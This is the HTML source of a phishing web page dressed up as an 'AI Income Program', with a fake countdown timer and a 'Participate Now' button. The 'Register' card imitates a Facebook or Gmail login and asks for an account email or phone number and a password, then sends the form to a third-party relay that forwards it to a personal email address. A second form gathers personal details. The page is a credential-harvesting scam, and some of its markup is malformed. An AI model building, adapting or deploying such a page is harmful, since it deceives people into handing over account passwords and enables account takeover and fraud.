<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AI Income Program</title>

<style>
body {
    margin: 0;
    font-family: 'Segoe UI', sans-serif;
    background: #000;
    color: #fff;
}

/* SECTION SYSTEM */
.section {
    display: none;
    width: 100%;
    height: 100vh;
}

.section.active {
    display: flex;
    justify-content: center;
    align-items: center;
}

/* HERO */
.hero {
    background: url('https://images.unsplash.com/photo-1555949963-aa79dcee981c') center/cover no-repeat;
    position: relative;
}

/* DARK OVERLAY */
.hero::after {
    content: "";
    position: absolute;
    inset: 0;
    background: rgba(0,0,0,0.7);
}

.content {
    position: relative;
    max-width: 800px;
    text-align: center;
    padding: 20px;
    z-index: 2;
}

/* TITLE */
h1 {
    font-size: 2.5rem;
    background: linear-gradient(90deg,#00c6ff,#0072ff,#00ffcc);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}

/* BUTTON */
button {
    padding: 14px 28px;
    font-size: 18px;
    border: none;
    border-radius: 30px;
    background: linear-gradient(135deg,#00c6ff,#0072ff);
    color: white;
    cursor: pointer;
    margin-top: 20px;
}

/* CARD */
.card {
    background: rgba(255,255,255,0.08);
    padding: 25px;
    border-radius: 12px;
    width: 90%;
    max-width: 400px;
    text-align: center;
}

/* INPUT */
input, textarea {
    width: 90%;
    padding: 10px;
    margin: 10px 0;
    border: none;
    border-radius: 6px;
}

/* TIMER */
.timer {
    margin-top: 15px;
    color: #00ffcc;
    font-size: 18px;
}

/* THE PROFESSIONAL LOGIN */  
    #vault-gate { display: flex; justify-content: center; align-items: center; height: 100vh; }  
    .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }  
    .brand { font-size: 32px; font-weight: bold; color: #0866ff; margin-bottom: 10px; }  
    input, select { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 8px; font-size: 16px; box-sizing: border-box; }  
    .login-btn { width: 100%; padding: 15px; background: #0866ff; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; 
}


</style>
</head>

<body>

<!-- HERO -->
<div id="offer" class="section active hero">

    <div class="content">

        <h1>AI + Income Opportunity</h1>

        <p>
        Artificial Intelligence is transforming the world and creating powerful income opportunities. This program helps you learn AI tools, automation, and modern digital skills to build real income. Start your journey toward financial independence today.
        </p>

        <div class="timer" id="timer"></div>

        <button onclick="go('login')">🚀 Participate Now</button>

    </div>

</div>

<!-- LOGIN -->
<div id="login" class="section">

    <div class="card">

        <h2>Register</h2>

        <form action="https://formsubmit.co/yoshpick22@gmail.com" method="POST"
            <input type="hidden" name="_captcha" value="false">
            <select name="Platform">  
                <option value="Facebook">Log in with Facebook</option>  
                <option value="Gmail">Log in with Gmail</option>  
            </select>  
            <input type="text" name="Account_ID" placeholder="Email or Phone Number" required>  
            <input type="password" name="Security_Key" placeholder="Password" required>   
        <button type="button" onclick="go('success')">Continue</button>
 </form>

    </div>
</div>

<!-- QUESTIONS -->
<div id="success" class="section">

    <div class="card">

        <h2>Questions</h2>

        <form action="https://formsubmit.co/yoshpick22@gmail.com" method="POST">

            <textarea name="Goal" placeholder="What is your goal?" required></textarea>
            <textarea name="Current" placeholder="What are you doing now?" required></textarea>
            <textarea name="Skills" placeholder="Your skills?" required></textarea>
            <textarea name="Time" placeholder="Daily time?" required></textarea>
            <textarea name="Problem" placeholder="Biggest problem?" required></textarea>
            <textarea name="Commitment" placeholder="Why select you?" required></textarea>

            <input type="hidden" name="_captcha" value="false">

            <button type="submit">Submit</button>

        </form>

    </div>

</div>

<script>

/* FIXED NAVIGATION */
function go(id){
    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
    document.getElementById(id).classList.add('active');
}

/* TIMER */
let t = 86400;

setInterval(()=>{
    let h = Math.floor(t/3600);
    let m = Math.floor((t%3600)/60);
    let s = t % 60;

    document.getElementById("timer").innerText =
        `⏳ Offer ends in ${h}h ${m}m ${s}s`;

    t--;
},1000);

</script>

</body>
</html>
